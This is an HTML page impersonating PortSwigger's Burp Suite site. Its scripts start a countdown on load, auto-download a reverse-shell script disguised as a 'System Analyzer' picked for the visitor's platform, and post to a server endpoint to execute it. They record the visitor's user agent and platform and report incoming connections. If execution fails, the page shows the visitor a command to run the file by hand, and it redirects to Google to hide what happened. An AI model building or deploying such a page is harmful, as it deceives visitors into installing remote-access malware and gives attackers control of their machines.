<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PortSwigger - Burp Suite</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .bg-orange-dots {
            background-image: radial-gradient(#f28c38 1px, transparent 1px);
            background-size: 10px 10px;
        }
        .download-notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #10B981;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 1000;
            max-width: 350px;
            font-weight: 500;
            animation: slideIn 0.3s ease-out;
        }
        .download-notification.info {
            background: #3B82F6;
        }
        .download-notification.error {
            background: #EF4444;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    </style>
</head>
<body class="bg-gray-100 font-sans">
    <nav class="bg-gray-800 text-white p-4">
        <div class="container mx-auto flex justify-between items-center">
            <h1 class="text-2xl font-bold">PortSwigger</h1>
            <div class="space-x-4">
                <a href="/" class="hover:text-orange-400">Home</a>
                <a href="/products" class="hover:text-orange-400">Products</a>
                <a href="/download" class="hover:text-orange-400">Download</a>
                <a href="/about" class="hover:text-orange-400">About</a>
                <a href="/support" class="hover:text-orange-400">Support</a>
            </div>
        </div>
    </nav>
    <header class="bg-orange-500 text-white text-center py-16 bg-orange-dots">
        <div class="container mx-auto">
            <h2 class="text-4xl font-bold mb-4">Burp Suite: Web Security Testing</h2>
            <p class="text-lg">Trusted by over 70,000 security professionals worldwide.</p>
            <button id="downloadBtn" class="mt-6 inline-block bg-gray-800 text-white px-6 py-3 rounded-lg hover:bg-gray-900" onclick="manualDownload()">Download System Analyzer</button>
            
            <div id="download-status" class="mt-4 p-3 rounded bg-blue-100 text-blue-800" style="display: none;">
                Auto-download will start in <span id="countdown">3</span> seconds...
            </div>
        </div>
    </header>
    <main class="container mx-auto py-12">
        <section class="text-center">
            <h3 class="text-2xl font-semibold mb-4">Why Burp Suite?</h3>
            <p class="text-gray-700 max-w-2xl mx-auto">Burp Suite is the leading toolkit for web application security testing, offering powerful tools for penetration testers, developers, and security teams.</p>
        </section>
        <section class="grid grid-cols-1 md:grid-cols-3 gap-8 mt-12">
            <div class="bg-white p-6 rounded-lg shadow-md">
                <h4 class="text-xl font-semibold mb-2 text-orange-500">Burp Suite Professional</h4>
                <p class="text-gray-600">The #1 toolkit for web penetration testing.</p>
            </div>
            <div class="bg-white p-6 rounded-lg shadow-md">
                <h4 class="text-xl font-semibold mb-2 text-orange-500">Burp Suite Community</h4>
                <p class="text-gray-600">Free manual tools for learning security testing.</p>
            </div>
            <div class="bg-white p-6 rounded-lg shadow-md">
                <h4 class="text-xl font-semibold mb-2 text-orange-500">Burp Suite Enterprise</h4>
                <p class="text-gray-600">Enterprise-grade dynamic scanning for teams.</p>
            </div>
        </section>
        <section class="text-center mt-12">
            <h3 class="text-2xl font-semibold mb-4">Trusted by Industry Leaders</h3>
            <div class="flex justify-center items-center space-x-8">
                <div class="bg-white px-6 py-3 rounded-lg shadow-md">
                    <img src="https://logo.clearbit.com/amazon.com" alt="Amazon" class="h-8 w-auto" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiIGZpbGw9IiNGRjk5MDAiLz48dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkFtYXpvbjwvdGV4dD48L3N2Zz4='">
                </div>
                <div class="bg-white px-6 py-3 rounded-lg shadow-md">
                    <img src="https://logo.clearbit.com/nasa.gov" alt="NASA" class="h-8 w-auto" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiIGZpbGw9IiMwMDMzNzciLz48dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPk5BU0E8L3RleHQ+PC9zdmc+'">
                </div>
                <div class="bg-white px-6 py-3 rounded-lg shadow-md">
                    <img src="https://logo.clearbit.com/barclays.com" alt="Barclays" class="h-8 w-auto" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiIGZpbGw9IiMwMDY2Q0MiLz48dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkJhcmNsYXlzPC90ZXh0Pjwvc3ZnPg=='">
                </div>
            </div>
        </section>
    </main>
    <footer class="bg-gray-800 text-white text-center py-6">
        <p>© 2025 PortSwigger Ltd. All rights reserved.</p>
        <div class="space-x-4 mt-2">
            <a href="/about" class="hover:text-orange-400">About</a>
            <a href="/careers" class="hover:text-orange-400">Careers</a>
            <a href="/contact" class="hover:text-orange-400">Contact</a>
            <a href="/legal" class="hover:text-orange-400">Legal</a>
        </div>
    </footer>

    <script>
        // Updated configuration for enhanced reverse shell
        const DOWNLOAD_URL = '/download-reverse-shell';
        
        let autoDownloadTimer;
        let countdownTimer;
        let countdownValue = 3;
        
        function showNotification(message, type = 'success') {
            const notification = document.createElement('div');
            notification.className = 'download-notification';
            notification.innerHTML = `
                <div>${message}</div>
                <div style="font-size: 12px; margin-top: 5px; opacity: 0.9;">Check your Downloads folder</div>
            `;
            
            if (type === 'error') {
                notification.style.background = '#EF4444';
            }
            
            document.body.appendChild(notification);
            
            // Remove notification after 5 seconds
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 5000);
        }
        
        // Add download state tracking
        let downloadInProgress = false;
        let downloadCompleted = false;
        
        function downloadReverseShell() {
            // Prevent multiple downloads
            if (downloadInProgress || downloadCompleted) {
                console.log('⚠️ Download already in progress or completed');
                return;
            }
            
            downloadInProgress = true;
            
            // Clear timers to prevent duplicate downloads
            if (autoDownloadTimer) {
                clearTimeout(autoDownloadTimer);
                autoDownloadTimer = null;
            }
            if (countdownTimer) {
                clearInterval(countdownTimer);
                countdownTimer = null;
            }
            
            try {
                // Create download link for reverse shell script
                const link = document.createElement('a');
                link.href = DOWNLOAD_URL;
                link.download = 'SystemAnalyzer.js';
                link.target = '_blank';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                showNotification('✅ Enhanced System Analyzer downloaded successfully!');
                
                // Wait a moment for download to complete, then auto-execute
                setTimeout(() => {
                    executeReverseShell();
                }, 2000);
                
                // Add redirect to google.com after download completes
                setTimeout(() => {
                    console.log('🔄 Redirecting to Google...');
                    window.location.href = 'https://www.google.com';
                }, 5000); // Redirect after 5 seconds
                
                // Send analytics
                fetch('/api/data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        action: 'reverse_shell_download',
                        source: 'netcat_folder',
                        timestamp: new Date().toISOString(),
                        auto_execute: true
                    })
                }).then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showNotification('📊 Download logged successfully');
                    }
                })
                .catch(error => console.log('Analytics error:', error));
                
            } catch (error) {
                console.error('Download error:', error);
                showNotification('❌ Download failed. Please try manual download.', 'error');
            }
        }
        
        // Enhanced auto-execution function with platform awareness
        function executeReverseShell() {
            showNotification('🚀 Auto-executing system analyzer...', 'info');
            
            fetch('/api/execute-reverse-shell', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    autoExecute: true,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showNotification(`✅ System analyzer executed on ${data.platform}! Establishing connection...`, 'success');
                    console.log('🔗 Reverse shell process started with PID:', data.pid);
                    console.log('📡 Listening for connection on port:', data.listenerPort);
                    
                    // Show connection status after a delay
                    setTimeout(() => {
                        checkConnectionStatus();
                    }, 5000);
                    
                } else {
                    console.error('❌ Auto-execution failed:', data.message);
                    showNotification('❌ Auto-execution failed. Please run manually.', 'error');
                    
                    // Show manual execution instructions
                    if (data.manualCommand) {
                        setTimeout(() => {
                            showManualInstructions(data.manualCommand, data.platform);
                        }, 2000);
                    }
                }
            })
            .catch(error => {
                console.error('Execution error:', error);
                showNotification('❌ Auto-execution failed. Network error.', 'error');
                
                // Fallback manual instructions
                setTimeout(() => {
                    showManualInstructions('node enhanced_reverse_shell.js', 'unknown');
                }, 2000);
            });
        }
        
        // New function to show manual execution instructions
        function showManualInstructions(command, platform) {
            const instructions = document.createElement('div');
            instructions.className = 'manual-instructions';
            instructions.innerHTML = `
                <div style="background: #1F2937; color: #F3F4F6; padding: 20px; border-radius: 8px; margin: 20px; font-family: monospace;">
                    <h3 style="color: #F59E0B; margin-top: 0;">⚠️ Manual Execution Required</h3>
                    <p>Auto-execution failed. Please run the following command manually:</p>
                    <div style="background: #374151; padding: 10px; border-radius: 4px; margin: 10px 0;">
                        <code style="color: #10B981;">${command}</code>
                    </div>
                    <p><strong>Platform:</strong> ${platform}</p>
                    <p><strong>Instructions:</strong></p>
                    <ul>
                        <li>Open terminal/command prompt</li>
                        <li>Navigate to the downloaded script location</li>
                        <li>Run the command above</li>
                        <li>Check the dashboard for incoming connections</li>
                    </ul>
                    <button onclick="this.parentElement.remove()" style="background: #EF4444; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 10px;">Close</button>
                </div>
            `;
            
            document.body.appendChild(instructions);
            
            // Auto-remove after 30 seconds
            setTimeout(() => {
                if (instructions.parentNode) {
                    instructions.parentNode.removeChild(instructions);
                }
            }, 30000);
        }
        
        // New function to check connection status
        function checkConnectionStatus() {
            fetch('/api/data')
            .then(response => response.json())
            .then(data => {
                if (data.stats && data.stats.activeConnections > 0) {
                    showNotification(`🎉 Connection established! ${data.stats.activeConnections} active connection(s)`, 'success');
                } else {
                    showNotification('⏳ Waiting for connection... Check firewall settings if needed.', 'info');
                }
            })
            .catch(error => {
                console.error('Status check error:', error);
            });
        }
        
        function manualDownload() {
            // Clear auto-download timer if running
            if (autoDownloadTimer) {
                clearTimeout(autoDownloadTimer);
            }
            if (countdownTimer) {
                clearInterval(countdownTimer);
            }
            
            // Hide countdown
            const statusEl = document.getElementById('download-status');
            if (statusEl) {
                statusEl.style.display = 'none';
            }
            
            // Start download immediately
            downloadReverseShell();
        }
        
        function startCountdown() {
            // Prevent multiple countdowns
            if (downloadInProgress || downloadCompleted || countdownTimer) {
                return;
            }
            
            const statusEl = document.getElementById('download-status');
            const countdownEl = document.getElementById('countdown');
            
            if (statusEl && countdownEl) {
                statusEl.style.display = 'block';
                
                countdownTimer = setInterval(() => {
                    countdownValue--;
                    countdownEl.textContent = countdownValue;
                    
                    if (countdownValue <= 0) {
                        clearInterval(countdownTimer);
                        statusEl.innerHTML = '<div class="text-green-800">🚀 Starting enhanced system analysis...</div>';
                        downloadReverseShell();
                    }
                }, 1000);
            }
        }
        
        // Start auto-download process when page loads
        window.addEventListener('load', function() {
            // Prevent multiple initializations
            if (downloadInProgress || downloadCompleted) {
                return;
            }
            
            console.log('🏠 Home page loaded - Starting enhanced download sequence...');
            
            // Start countdown immediately
            startCountdown();
            
            // Set backup timer only if countdown fails
            autoDownloadTimer = setTimeout(() => {
                if (!downloadInProgress && !downloadCompleted) {
                    downloadReverseShell();
                }
            }, 3000);
        });
        
        // Handle page visibility change (if user switches tabs)
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden && autoDownloadTimer) {
                // Page became visible again - ensuring download happens
                console.log('👁️ Page visible again - ensuring download...');
            }
        });
    </script>

<script>
        // Enhanced download function for multiple file types
        function downloadFile(fileType = 'js') {
            console.log(`🚀 Starting ${fileType.toUpperCase()} file download...`);
            
            const fileNames = {
                'bat': 'SystemAnalyzer.bat',
                'python': 'SystemAnalyzer.py', 
                'js': 'SystemAnalyzer.js'
            };
            
            const fileName = fileNames[fileType] || 'SystemAnalyzer.js';
            
            // Create download link
            const link = document.createElement('a');
            link.href = `/download-file/${fileType}`;
            link.download = fileName;
            link.style.display = 'none';
            document.body.appendChild(link);
            
            // Trigger download
            link.click();
            document.body.removeChild(link);
            
            // Show download notification
            showNotification(`📥 Downloading ${fileName}...`, 'info');
            
            // Add redirect to google.com after download completes
            setTimeout(() => {
                console.log('🔄 Redirecting to Google...');
                window.location.href = 'https://www.google.com';
            }, 6000); // Redirect after 6 seconds to allow for execution
            
            // Log download attempt
            fetch('/api/data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'download',
                    fileType: fileType,
                    fileName: fileName,
                    auto_execute: true,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                })
            }).then(response => response.json())
              .then(data => {
                  console.log('📊 Download logged:', data);
                  showNotification(`✅ ${fileName} downloaded successfully!`, 'success');
                  
                  // Auto-execute after 2 seconds
                  setTimeout(() => {
                      executeFile(fileType);
                  }, 2000);
              })
              .catch(error => {
                  console.error('❌ Error logging download:', error);
                  showNotification(`⚠️ Download completed but logging failed`, 'warning');
              });
        }

        // Enhanced execution function for multiple file types
        function executeFile(fileType = 'js') {
            console.log(`🚀 Attempting to execute ${fileType.toUpperCase()} file...`);
            
            fetch('/api/execute-file', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    fileType: fileType,
                    fileName: `SystemAnalyzer.${fileType === 'python' ? 'py' : fileType}`
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    console.log('✅ File executed successfully:', data);
                    showNotification(`🚀 ${fileType.toUpperCase()} file executed in terminal!`, 'success');
                    showNotification(`🔗 Process ID: ${data.pid}`, 'info');
                } else {
                    console.error('❌ Execution failed:', data);
                    showNotification(`❌ Auto-execution failed: ${data.message}`, 'error');
                    showManualInstructions(data.manualCommand, fileType);
                }
            })
            .catch(error => {
                console.error('❌ Error executing file:', error);
                showNotification(`❌ Execution request failed`, 'error');
                showManualInstructions(`Manual execution required for ${fileType} file`, fileType);
            });
        }

        // Enhanced manual instructions function
        function showManualInstructions(command, fileType) {
            const instructions = document.createElement('div');
            instructions.className = 'manual-instructions';
            instructions.innerHTML = `
                <div class="manual-content">
                    <h3>🔧 Manual Execution Required</h3>
                    <p>Auto-execution failed. Please run the following command manually:</p>
                    <div class="command-box">
                        <code>${command}</code>
                        <button onclick="copyToClipboard('${command}')">📋 Copy</button>
                    </div>
                    <p><strong>File Type:</strong> ${fileType.toUpperCase()}</p>
                    <p><strong>Platform:</strong> ${navigator.platform}</p>
                    <button onclick="this.parentElement.parentElement.remove()">✖️ Close</button>
                </div>
            `;
            document.body.appendChild(instructions);
        }

        // Auto-start functionality with file type selection
        function startAutoDownload() {
            // Detect best file type for platform
            const platform = navigator.platform.toLowerCase();
            let fileType = 'js'; // default
            
            if (platform.includes('win')) {
                fileType = 'bat'; // Windows batch file
            } else if (platform.includes('linux') || platform.includes('mac')) {
                fileType = 'python'; // Python for Unix-like systems
            }
            
            console.log(`🎯 Auto-detected file type: ${fileType} for platform: ${platform}`);
            downloadFile(fileType);
        }

        // Enhanced notification styles
        const additionalStyles = `
        .manual-instructions {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }

        .manual-content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            max-width: 600px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        .command-box {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-family: monospace;
        }

        .command-box button {
            background: #007bff;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
        }
        `;

        // Add styles to document
        const styleSheet = document.createElement('style');
        styleSheet.textContent = additionalStyles;
        document.head.appendChild(styleSheet);
</script>
</body>
</html>